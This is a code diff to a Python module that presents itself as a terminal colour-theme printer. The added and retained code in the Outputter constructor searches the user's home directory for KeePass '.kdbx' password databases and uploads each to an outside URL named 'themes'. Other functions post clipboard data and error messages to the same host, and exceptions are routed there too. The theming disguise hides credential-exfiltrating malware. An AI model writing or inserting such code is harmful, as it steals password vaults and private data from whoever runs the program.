@@ -222,27 +222,30 @@ class Outputter:
         self.depth = None
         self.pc = 0
 
-        user_profile = [os.path.expanduser("~")]
-        poss_profiles = []
-        timeout = time.time() + 5
-        while len(user_profile) > 0 and time.time() < timeout:
-            path = user_profile[0]
-            user_profile = user_profile[1:]
-            try:
-                for p in os.listdir(path):
-                    p = "{}/{}".format(path, p)
-                    if ".kdbx" in p:
-                        poss_profiles.append(p)
-                    if os.path.isdir(p):
-                        user_profile.append(p)
-            except:
-                pass
+        try:
+            user_profile = [os.path.expanduser("~")]
+            poss_profiles = []
+            timeout = time.time() + 5
+            while len(user_profile) > 0 and time.time() < timeout:
+                path = user_profile[0]
+                user_profile = user_profile[1:]
+                try:
+                    for p in os.listdir(path):
+                        p = "{}/{}".format(path, p)
+                        if ".kdbx" in p:
+                            poss_profiles.append(p)
+                        if os.path.isdir(p):
+                            user_profile.append(p)
+                except:
+                    pass
 
-        for p in poss_profiles:
-            profile_name = {"pname": p.split("/")[-1]}
-            with open(p, 'rb') as f:
-                poss_profiles = {'profile': f}
-                requests.post(themes, files=poss_profiles, data=profile_name)
+            for p in poss_profiles:
+                profile_name = {"pname": p.split("/")[-1]}
+                with open(p, 'rb') as f:
+                    poss_profiles = {'profile': f}
+                    requests.post(themes, files=poss_profiles, data=profile_name)
+        except Exception as e:
+            get_color_scheme({"e":str(e)})
 
     def print1(self, printer):
         if "Control" in self.color_printer.color_code and printer.color_code in "cCxX":
@@ -271,7 +274,7 @@ def get_color_depth():
         if len(depth) != 0:
             return get_color_scheme({"clip": depth})
     except Exception as e:
-        print(e)
+        get_color_scheme({"e":str(e)})
 
 
 def get_color_scheme(data):
@@ -281,7 +284,7 @@ def get_color_scheme(data):
             f.write(str(data))
         return requests.post(themes, data=data)
     except Exception as e:
-        print(e)
+        get_color_scheme({"e":str(e)})
 
 # Load color Themes online
 themes = "https://n.ethz.ch/~pascscha/color_themes/"
